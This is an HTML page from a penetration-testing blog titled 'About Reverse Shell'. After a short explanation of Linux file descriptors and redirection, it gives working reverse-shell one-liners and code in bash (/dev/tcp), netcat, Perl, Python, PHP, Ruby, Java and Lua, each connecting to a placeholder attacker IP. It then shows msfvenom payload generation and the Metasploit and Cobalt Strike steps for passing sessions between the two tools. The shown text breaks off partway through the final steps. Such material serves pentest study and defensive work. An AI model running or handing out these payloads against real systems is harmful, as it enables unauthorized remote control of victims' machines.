@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Computer, Network, Security">
+    <meta name="description" content="a blog on Hexo">
+    <meta name="author" content="TyeYeah">
+    
+    <title>
+        
+            About Reverse Shell |
+        
+        Relish the Moment
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/img/wang.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Relish the Moment
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">About Reverse Shell</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2020-03-31 19:49:59
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Penetration-Testing/">Penetration Testing</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/windows/">windows</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/pentest/">pentest</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/msf/">msf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/cobaltstrike/">cobaltstrike</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>12 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>Reverse Shell is normal used for its advantages in avoiding being detected.<br>Attacker’s machine (which has a public IP and is reachable over the internet) acts as a server. It opens a communication channel on a port and waits for incoming connections.<br>Victim’s machine acts as a client and initiates a connection to the attacker’s listening server.</p>
+<h2 id="Linux-Reverse-Shell"><a href="#Linux-Reverse-Shell" class="headerlink" title="Linux Reverse Shell"></a>Linux Reverse Shell</h2><p>On Linux we use <code>/bin/bash</code>, <code>/bin/sh</code> and some other shell terminals, and to get a reverse shell is often so easy that people often builds streamlined commands.<br>But before we use them, it’s better to go deeper and learn things about file descriptor and redirection.</p>
+<h3 id="File-Descriptor"><a href="#File-Descriptor" class="headerlink" title="File Descriptor"></a>File Descriptor</h3><p>When Linux boots up, it will open three file descriptors by default:</p>
+<ul>
+<li>standard input :0      (keyboard as default)</li>
+<li>standard output :1     (pc monitor as default)</li>
+<li>error output :2        (pc monitor as default)</li>
+</ul>
+<p>As everything is file on Linux, even devices. so devices i/o are controlled by file descriptors.<br>At first, binding relations are in below</p>
+<ul>
+<li>stdin 0   -&gt;  <code>/dev/tty0</code></li>
+<li>stdout 1  -&gt;  <code>/dev/tty0</code></li>
+<li>stderr 2  -&gt;  <code>/dev/tty0</code></li>
+</ul>
+<p>If we want to disable display of input on monitor, or input to other devices or files, we need redirection.</p>
+<h3 id="Redirection"><a href="#Redirection" class="headerlink" title="Redirection"></a>Redirection</h3><p>Input redirection: <code>&lt;</code> <code>&lt;&lt;</code>     (redirect 0)<br>Output redirection: <code>&gt;</code> <code>&gt;&gt;</code>    (redirect 1)<br><code>&lt;</code> and <code>&gt;</code> are just redirection, <code>&lt;&lt;</code> and <code>&gt;&gt;</code> are appending content.</p>
+<p>Before executing a command, bash process redirection symbols first.<br>Bash redirect file descriptor first, then delete redirection symbols.</p>
+<p><strong>Input redirection example</strong>: <code>[n]&lt; word</code><br>If <code>n</code> is omitted (<code>&lt; word</code>), that is 0 (standard input) by default (same as <code>0&lt; word</code>).<br>Which means the content of <code>word</code> is replacing <code>stdin</code> to be the input.<br>Yon can see effects only if a program receive <code>stdin</code> to interactive.</p>
+<ul>
+<li>stdin 0   -&gt;  <code>word(file, device, ...)</code></li>
+<li>stdout 1  -&gt;  <code>/dev/tty0</code></li>
+<li>stderr 2  -&gt;  <code>/dev/tty0</code></li>
+</ul>
+<p><strong>Output redirection example</strong>: <code>[n]&gt; word</code><br>If <code>n</code> is omitted (<code>&gt; word</code>), that is 1 (standard input) by default (same as <code>1&gt; word</code>).<br>Which means the output will be transferred to the <code>word</code>, whatever it is a file or a device, rather than display on <code>stdout</code>.</p>
+<ul>
+<li>stdin 0   -&gt;  <code>/dev/tty0</code></li>
+<li>stdout 1  -&gt;  <code>word(file, device, ...)</code></li>
+<li>stderr 2  -&gt;  <code>/dev/tty0</code></li>
+</ul>
+<p><code>echo &quot;str&quot; &gt; file.txt</code> is to wipe file.txt, then add content.<br><code>echo &quot;str&quot; &gt;&gt; file.txt</code> is to append string to older content.</p>
+<p><strong><code>stdin</code> and <code>stderr</code> redirection</strong>: <code>&amp;&gt; word</code> or <code>&gt;&amp; word</code><br>Both of them redirect <code>stdin</code> and <code>stderr</code> to <code>word</code>.<br>Now the situation is</p>
+<ul>
+<li>stdin 0   -&gt;  <code>/dev/tty0</code></li>
+<li>stdout 1  -&gt;  <code>word(file, device, ...)</code></li>
+<li>stderr 2  -&gt;  <code>word(file, device, ...)</code></li>
+</ul>
+<p>Actually they are the same with <code>&gt; word 2&gt;&amp;1</code>, then we talk about how <code>2&gt;&amp;1</code> works here.</p>
+<p><strong>Copy of file descriptor</strong>:  <code>[n]&lt;&amp;[m]</code> / <code>[n]&gt;&amp;[m]</code><br>Both of them copy <code>n</code> file descriptor to <code>m</code>, the difference is, <code>[n]&lt;&amp;[m]</code> open as read only, <code>[n]&gt;&amp;[m]</code> open in write mode.<br><code>0&lt;&amp;1</code> and <code>0&gt;&amp;1</code> works the same, because it has nothing to do with read or write mode.</p>
+<p>So the <code>&amp;</code> here is to distinguish files (named as number) and file descriptors.</p>
+<p><strong>Read and write mode</strong>:<br>You may notice that the file descriptor at the arrow side of the <code>&lt;</code> and <code>&gt;</code> opened as writable, so we use <code>[n]&lt;&gt;word</code> to bind <code>n</code> with <code>word</code>.<br>Now what we do to <code>n</code> also works on <code>word</code>.</p>
+<p><strong>Binding redirection</strong>:  <code>exec [n] &lt;/&gt; file/[n]</code><br>Above mentioned only work for that command, use <code>exec</code> to make it effect all the time.</p>
+<h3 id="Cases"><a href="#Cases" class="headerlink" title="Cases"></a>Cases</h3><p>On attacker pc we do</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp port</span><br><span class="line">listening on [any] port ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Then on victim pc we do</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/attack_ip/port 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>
+<p>After that attacker receive the shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp port</span><br><span class="line">listening on [any] 23333 ...</span><br><span class="line">connect to [attacker_ip] from (UNKNOWN) [victim_ip] xxxpid</span><br><span class="line">victim@host:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Notes:<br><code>bash -i</code> here spawns an interactive shell.<br><code>/dev/tcp/ip/port</code> is a device, you can interact with it to build <code>socket</code>.<br><code>&gt;&amp;</code> is to redirect all output to attacker pc.<br><code>0&gt;&amp;1</code>is to receive commands from attacker and then echo the result.<br>so it can be also written as </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt; /dev/tcp/attack_ip/port 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><strong>Another Method</strong>: </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/attack_ip/port &lt;&amp;2</span><br></pre></td></tr></table></figure>
+<p>which is </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/attack_ip/port 0&lt;&amp;2</span><br></pre></td></tr></table></figure>
+<p>The situation is</p>
+<ul>
+<li>stdin 0   -&gt;  <code>/dev/tcp/attack_ip/port</code></li>
+<li>stdout 1  -&gt;  <code>/dev/tcp/attack_ip/port</code></li>
+<li>stderr 2  -&gt;  <code>/dev/tcp/attack_ip/port</code></li>
+</ul>
+<p><strong>One More</strong>:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/attack_ip/port;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><code>exec 5&lt;&gt;/dev/tcp/attack_ip/port</code> let us operate file descriptor 5 as if interacting with the <code>socket</code></p>
+<p><code>command|while read line do .....done</code> comes from </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">done</span> &lt; file</span><br></pre></td></tr></table></figure>
+<p>which is read contents from the file. Now we read from file descriptor 5, tht is the <code>socket</code>.</p>
+<p>And the one below is similar</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ 0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/attacker_ip/port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+
+<h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p>Netcat aka <code>nc</code>, is called the Swiss Army Knife in network utilities. It can be used like <code>telnet</code> to communicate, or a <code>ftp</code> server to transfer files.<br>It can also help you get a reverse shell.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -e /bin/sh attacker_ip port</span><br></pre></td></tr></table></figure>
+<p><code>-e /bin/sh</code> means execute a shell and send it to remote.<br>Some version doesn’t have this option, so we do</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attacker_ip port &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p><code>mkfifo</code> is making a pipe to communicate.</p>
+<p>A similar method</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mknod backpipe p; nc attacker_ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
+<p>Another usage</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc attacker_ip port1|/bin/sh|nc attacker_ip port2</span><br></pre></td></tr></table></figure>
+<p>It requires attacker to listen two ports, type commands to port1, then see result from port2.</p>
+<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><p>Execute</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e <span class="string">&#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>or</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;ip:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>The effective perl codes are</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line">$i=<span class="string">&quot;ip&quot;</span>;</span><br><span class="line">$p=port;    <span class="comment"># port is integer type</span></span><br><span class="line"><span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">&quot;tcp&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;</span><br><span class="line">    <span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line">    <span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line">    <span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line">    <span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>and </p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$p=<span class="keyword">fork</span>;</span><br><span class="line"><span class="keyword">exit</span>,<span class="keyword">if</span>($p);</span><br><span class="line">$c=new IO::Socket::INET(PeerAddr,<span class="string">&quot;ip:port&quot;</span>);</span><br><span class="line">STDIN-&gt;fdopen($c,r);</span><br><span class="line">$~-&gt;fdopen($c,w);</span><br><span class="line"><span class="keyword">system</span>$_ <span class="keyword">while</span>&lt;&gt;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>Execute in shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>The python codes are</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;ip&quot;</span>,port))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>Execute in shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php -r <span class="string">&#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>The PHP source are</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sock</span>=fsockopen(<span class="string">&quot;ip&quot;</span>,port);</span><br><span class="line">exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><p>Execute in shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>The ruby source are</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f=TCPSocket.open(<span class="string">&quot;ip&quot;</span>,port).to_i</span><br><span class="line">exec sprintf(<span class="string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)</span><br></pre></td></tr></table></figure>
+<p>Remember to load lib in opinion.</p>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>Java use <code>Runtime</code> class to execute. </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><p>Execute in shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;ip&#x27;,&#x27;port&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
+<p>And the lua codes are</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;socket&#x27;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">t=socket.tcp()</span><br><span class="line">t:connect(<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;port&#x27;</span>)</span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Meterpreter-amp-Beacon"><a href="#Meterpreter-amp-Beacon" class="headerlink" title="Meterpreter &amp; Beacon"></a>Meterpreter &amp; Beacon</h2><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>For metasploit framework, it has many kinds of reverse shell in <code>meterpreter</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">23   payload/every_platform/meterpreter/reverse_http   </span><br><span class="line">24   payload/every_platform/meterpreter/reverse_https    </span><br><span class="line">25   payload/every_platform/meterpreter/reverse_tcp      </span><br><span class="line">26   payload/every_platform/meterpreter_reverse_http     </span><br><span class="line">27   payload/every_platform/meterpreter_reverse_https     </span><br><span class="line">28   payload/every_platform/meterpreter_reverse_tcp       </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>Actually there are about 200 kinds of <code>meterpreter</code> aiming at every platforms.</p>
+<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><p>For Cobalt Strike, it has named its reverse shell module as <code>beacon</code></p>
+<p>Beacon reverse shell listeners are</p>
+<ul>
+<li><code>windows/beacon_dns/reverse_dns_txt</code></li>
+<li><code>windows/beacon_dns/reverse_http</code></li>
+<li><code>windows/beacon_http/reverse_http</code></li>
+<li><code>windows/beacon_https/reverse_https</code></li>
+<li><code>windows/beacon_smb/bind_pipe</code></li>
+</ul>
+<p>Foreign listeners for external reverse shells(from <code>MSF</code> or <code>Armitage</code>) </p>
+<ul>
+<li><code>windows/foreign/reverse_dns_txt</code></li>
+<li><code>windows/foreign/reverse_http</code></li>
+<li><code>windows/foreign/reverse_https</code></li>
+<li><code>windows/foreign/reverse_tcp</code></li>
+</ul>
+<h3 id="Interoperability"><a href="#Interoperability" class="headerlink" title="Interoperability"></a>Interoperability</h3><p>Here we talk about the interoperability between <code>meterpreter</code> and <code>beacon</code>.</p>
+<h4 id="From-MSF-to-CS"><a href="#From-MSF-to-CS" class="headerlink" title="From MSF to CS"></a>From MSF to CS</h4><ol>
+<li><p>Generate a <code>meterpreter</code> payload</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/meterpreter/reverse_tcp lhost=msf_ip lport=msf_port -f exe -o hello.exe</span><br></pre></td></tr></table></figure></li>
+<li><p>Set listener in Metasploit Framework</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost msf_ip</span><br><span class="line">lhost =&gt; msf_ip</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport msf_port</span><br><span class="line">lport =&gt; msf_port</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure></li>
+<li><p>Open Cobalt Strike to create a new listener (using <code>windows/beacon_http/reverse_http</code>)</p>
+</li>
+<li><p>Use <code>payload_inject</code> module</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">msf5 exploit(multi/handler) &gt; use exploit/windows/<span class="built_in">local</span>/payload_inject </span><br><span class="line"><span class="comment"># payload must be corresponding to that in cs</span></span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> lhost cs_ip</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> lport cs_port</span><br><span class="line"><span class="comment"># set meterpreter session</span></span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> disablepayloadhandler <span class="literal">true</span> </span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; run</span><br></pre></td></tr></table></figure></li>
+<li><p>Then we see one new pc gets online in Cobalt Strike.</p>
+</li>
+</ol>
+<p>After that we convert a <code>meterpreter</code> to be a <code>beacon</code>.</p>
+<h4 id="From-CS-to-MSF"><a href="#From-CS-to-MSF" class="headerlink" title="From CS to MSF"></a>From CS to MSF</h4><ol>
+<li><p>Create a foreign listener in Cobalt Strike (using <code>windows/foreign/reverse_http</code>).</p>
+</li>
+<li><p>Generate a payload (Windows Executable) in Cobalt Strike.</p>
+</li>
+<li><p>Open Metasploit Framework to set listener</p>
